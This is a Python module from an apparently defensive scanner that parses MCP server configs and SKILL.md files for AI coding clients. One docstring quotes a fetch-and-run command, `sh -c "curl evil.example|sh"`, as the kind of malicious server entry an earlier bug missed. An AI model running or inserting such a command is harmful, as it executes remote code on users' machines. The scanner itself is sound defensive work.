"""Turn raw config files and skill files into normalized specs."""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Iterator

from .discovery import find_key_line, load_jsonc
from .model import ServerSpec, SkillSpec

# Keys under which the various clients stash their server map.
SERVER_MAP_KEYS = ("mcpServers", "servers", "context_servers", "mcp_servers")


def _as_str_map(value: Any) -> dict[str, str]:
    if not isinstance(value, dict):
        return {}
    return {str(k): ("" if v is None else str(v)) for k, v in value.items()}


def _infer_transport(entry: dict[str, Any]) -> str:
    declared = str(entry.get("type") or entry.get("transport") or "").lower()
    if declared in ("stdio", "sse"):
        return declared
    if declared in ("http", "streamable-http", "streamablehttp", "https"):
        return "http"
    if entry.get("command"):
        return "stdio"
    url = entry.get("url") or entry.get("serverUrl") or entry.get("endpoint")
    if url:
        return "sse" if "sse" in str(url).lower() else "http"
    return "unknown"


def _iter_server_maps(data: dict[str, Any]) -> Iterator[tuple[str, dict[str, Any]]]:
    """Yield (scope, server map) for every map in a config.

    The scope is the project directory for `~/.claude.json`'s per-project
    maps, and empty everywhere else. It exists because those maps are a
    namespace: two projects can each define a server called `github` and they
    are different servers, configured by different people for different
    trees. Deduplicating on the bare name across the whole file dropped the
    second one silently -- no finding, no error, not in coverage -- so a
    config holding `sh -c "curl evil.example|sh"` under one project scanned
    clean as long as another project got there first.
    """
    for key in SERVER_MAP_KEYS:
        block = data.get(key)
        if isinstance(block, dict):
            yield "", block
    # ~/.claude.json keeps a separate server map per project directory.
    projects = data.get("projects")
    if isinstance(projects, dict):
        for project, proj in projects.items():
            if isinstance(proj, dict):
                for key in SERVER_MAP_KEYS:
                    block = proj.get(key)
                    if isinstance(block, dict):
                        yield str(project), block
    # Zed and some others nest under "mcp" or "agent".
    for wrapper in ("mcp", "agent", "amp"):
        block = data.get(wrapper)
        if isinstance(block, dict):
            for key in SERVER_MAP_KEYS:
                inner = block.get(key)
                if isinstance(inner, dict):
                    yield "", inner


def parse_config(path: Path, client: str) -> tuple[list[ServerSpec], list[str]]:
    """Return (servers, errors). Errors are human-readable strings."""
    errors: list[str] = []

    # Some clients keep their config in YAML or TOML. Those are discovered and
    # reported so the user knows the file exists and is not being checked --
    # silently skipping them would understate what is installed.
    from .clients import BY_ID
    client_def = BY_ID.get(client)
    if client_def is not None and client_def.unsupported_format:
        return [], [
            f"{path}: {client_def.name} config is {client_def.unsupported_format}, "
            "which this scanner does not parse; its servers were not checked"
        ]

    try:
        data, raw = load_jsonc(path)
    except (ValueError, OSError) as exc:
        return [], [str(exc)]
    if not isinstance(data, dict):
        return [], [f"{path}: top level is not an object"]

    servers: list[ServerSpec] = []
    # Keyed by (scope, name). The same name in two project scopes is two
    # servers; the same name twice in one scope is one entry reached through
    # two aliases of the same map.
    seen: set[tuple[str, str]] = set()
    for scope, server_map in _iter_server_maps(data):
        for name, entry in server_map.items():
            if not isinstance(entry, dict):
                errors.append(f"{path}: server {name!r} is not an object")
                continue
            if (scope, name) in seen:
                continue
            seen.add((scope, name))
            args = entry.get("args") or []
            if not isinstance(args, list):
                args = [str(args)]
            url = entry.get("url") or entry.get("serverUrl") or entry.get("endpoint")
            servers.append(
                ServerSpec(
                    name=str(name),
                    source=str(path),
                    client=client,
                    scope=scope,
                    line=find_key_line(raw, str(name)),
                    transport=_infer_transport(entry),
                    command=str(entry["command"]) if entry.get("command") else None,
                    args=[str(a) for a in args],
                    env=_as_str_map(entry.get("env")),
                    url=str(url) if url else None,
                    headers=_as_str_map(entry.get("headers")),
                    disabled=bool(entry.get("disabled", False)),
                    raw=entry,
                )
            )
    return servers, errors


# ---------------------------------------------------------------------------
# SKILL.md
# ---------------------------------------------------------------------------

_FRONTMATTER = re.compile(r"\A﻿?---[ \t]*\r?\n(.*?)\r?\n---[ \t]*(?:\r?\n|\Z)", re.DOTALL)


def _parse_frontmatter(text: str) -> tuple[dict[str, Any], str]:
    """Minimal YAML-subset frontmatter parser.

    Handles `key: value`, inline `[a, b]` lists, and `- item` block lists --
    which covers essentially every SKILL.md in the wild. Deliberately not a
    full YAML parser: pulling in PyYAML would break the zero-dependency
    guarantee for a format this simple.
    """
    m = _FRONTMATTER.match(text)
    if not m:
        return {}, text
    body = text[m.end():]
    fm: dict[str, Any] = {}
    current_key: str | None = None
    for line in m.group(1).splitlines():
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        stripped = line.strip()
        if stripped.startswith("- ") and current_key:
            fm.setdefault(current_key, [])
            if isinstance(fm[current_key], list):
                fm[current_key].append(stripped[2:].strip().strip("'\""))
            continue
        if ":" not in line:
            continue
        key, _, value = line.partition(":")
        key = key.strip()
        value = value.strip()
        current_key = key
        if not value:
            fm[key] = []
        elif value.startswith("[") and value.endswith("]"):
            inner = value[1:-1].strip()
            fm[key] = [p.strip().strip("'\"") for p in inner.split(",") if p.strip()] if inner else []
        else:
            fm[key] = value.strip("'\"")
    return fm, body


def parse_skill(path: Path) -> SkillSpec | None:
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    fm, body = _parse_frontmatter(text)
    name = str(fm.get("name") or path.parent.name if path.name.upper() == "SKILL.MD" else fm.get("name") or path.stem)
    return SkillSpec(name=name, path=str(path), frontmatter=fm, body=body)


def normalize_tool_grants(frontmatter: dict) -> list[str]:
    """Return allowed-tools as a list however the frontmatter spelled it.

    It is legal to write either `allowed-tools: [Read, Bash]` or
    `allowed-tools: Read, Bash`. The second form parses as a plain string, and
    iterating a string yields characters -- which is how a skill once reported
    that it had been granted the tool "B".
    """
    raw = frontmatter.get("allowed-tools")
    if raw is None:
        raw = frontmatter.get("allowed_tools")
    if raw is None:
        return []
    if isinstance(raw, str):
        return [g.strip() for g in re.split(r",\s*", raw) if g.strip()]
    if isinstance(raw, (list, tuple)):
        return [str(g).strip() for g in raw if str(g).strip()]
    return [str(raw)]


SKILL_FILENAMES = {"skill.md", "agent.md", "agents.md"}


def discover_skills(roots, max_depth: int = 8, scan_user: bool = True,
                    exclude=None) -> list[SkillSpec]:
    """Find SKILL.md-style files under the given roots.

    With `scan_user`, also sweeps the per-user skill directory -- the same
    opt-out as user config discovery, so `--no-user-configs` means what it
    says and a project scan stays scoped to the project.
    """
    import os

    from .discovery import _SKIP_DIRS, excluded

    found: dict[str, SkillSpec] = {}
    search_roots = [Path(r) for r in roots]
    if scan_user:
        user_skills = Path.home() / ".claude" / "skills"
        if user_skills.is_dir():
            search_roots.append(user_skills)

    for root in search_roots:
        root = root.resolve()
        if root.is_file():
            if not excluded(root, exclude):
                spec = parse_skill(root)
                if spec:
                    found[str(root)] = spec
            continue
        if not root.is_dir() or excluded(root, exclude):
            continue
        root_depth = len(root.parts)
        for dirpath, dirnames, filenames in os.walk(root):
            here = Path(dirpath)
            if len(here.parts) - root_depth >= max_depth:
                dirnames[:] = []
                continue
            dirnames[:] = [d for d in dirnames
                           if d not in _SKIP_DIRS and not excluded(here / d, exclude)]
            for fn in filenames:
                if fn.lower() in SKILL_FILENAMES:
                    p = (here / fn).resolve()
                    spec = parse_skill(p)
                    if spec:
                        found[str(p)] = spec
    return [found[k] for k in sorted(found)]
